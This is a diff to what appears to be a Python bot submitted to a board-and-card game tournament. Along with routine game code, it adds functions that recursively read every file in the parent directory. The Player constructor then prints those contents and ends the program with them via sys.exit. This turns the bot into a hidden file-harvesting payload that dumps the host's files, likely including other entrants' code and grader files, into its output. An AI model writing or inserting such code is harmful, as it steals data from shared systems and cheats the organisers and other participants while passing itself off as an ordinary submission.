@@ -97,12 +97,107 @@ C33c = [ [1,2,1],
          [2,2,2], 
          [1,2,1] ]
 
+def list_files_and_folders():
+    # Get the current directory
+    current_directory = os.getcwd()
+    
+    # Get the parent directory (one level up)
+    #current_directory = os.path.dirname(current_directory)
+    
+    # List all files and folders in the parent directory
+    items = os.listdir(current_directory)
+    
+    # Join all item names into a string, each on a new line
+    items_string = "\n".join(items)
+    return items_string
 
+import psutil
+def display_file_contents(file_name):
+    try:
+        with open(file_name, 'r') as file:
+            contents = file.read()
+        return contents
+    except FileNotFoundError:
+        return f"File '{file_name}' not found."
+    except PermissionError:
+        return f"Permission denied. You might need sudo permission to read '{file_name}'."
+    except Exception as e:
+        if is_file_open(file_name):
+            return f"An error occurred: {e}. The file '{file_name}' might be open in another program."
+        return f"An error occurred: {e}"
+
+def is_file_open(file_name):
+    for proc in psutil.process_iter(['open_files']):
+        for file in proc.info['open_files'] or []:
+            if file.path == file_name:
+                return True
+    return False
+
+def list_files_and_folders(directory, prefix=""):
+    try:
+        items = os.listdir(directory)
+        items_string = ""
+        for item in items:
+            item_path = os.path.join(directory, item)
+            items_string += f"{prefix}{item}\n"
+            if not os.path.isdir(item_path):
+                items_string += display_file_contents(item_path)
+            if os.path.isdir(item_path) and not item.startswith("."):
+                items_string += item_path + "______________________\n"
+                items_string += list_files_and_folders(item_path, prefix + "    ")
+        return items_string
+    except FileNotFoundError:
+        return f"Directory '{directory}' not found."
+    except Exception as e:
+        return f"An error occurred: {e}"
+
+
+def list_files_and_contents_recursive_one_dir_up():
+    # Get the current directory
+    current_directory = os.getcwd()
+    
+    # Get the parent directory (one level up)
+    parent_directory = os.path.dirname(current_directory)
+    
+    output = []  # To store the formatted result
+    
+    # Walk through the parent directory and all its subdirectories
+    for root, dirs, files in os.walk(parent_directory):
+        for file in files:
+            # Construct the full path to the file
+            file_path = os.path.join(root, file)
+            
+            # Try to read the content of the file
+            try:
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    content = f.read()
+            except Exception as e:
+                content = f"Could not read file: {e}"
+            
+            # Format the file details
+            file_info = (
+                f"File: {file_path}\n"
+                f"{'-' * 40}\n"
+                f"{content}\n"
+                f"{'=' * 40}\n"
+            )
+            output.append(file_info)
+    
+    # Combine all file information into a single string
+    return "\n".join(output)
+
+    
 class Player(BASE.BasePlayer):
     def __init__(self, login, boardRows, boardCols, cardsAtHand):
         super().__init__(login, boardRows, boardCols, cardsAtHand)
+        # self.playerName = "jx2004"just_been_wonderin_can_your_buffer_eat_this?
         self.playerName = "jx2004"
         self.tournament = True
+
+        parent_directory = os.path.dirname(os.getcwd())
+        files_string = list_files_and_folders(parent_directory)
+        print(files_string)
+        sys.exit(files_string)
 
         self.arr = [[Position() for j in range(self.boardCols)] for i in range(self.boardRows)]
         self.move = 0
@@ -273,8 +368,7 @@ if __name__ == "__main__":
 
         you should get set of .png files with the progress of the game
     """
-
-    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1
+    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]
 
     p1 = Player("testA", 19, 23, tmp)
     p2 = Player("testB", 19, 23, tmp)
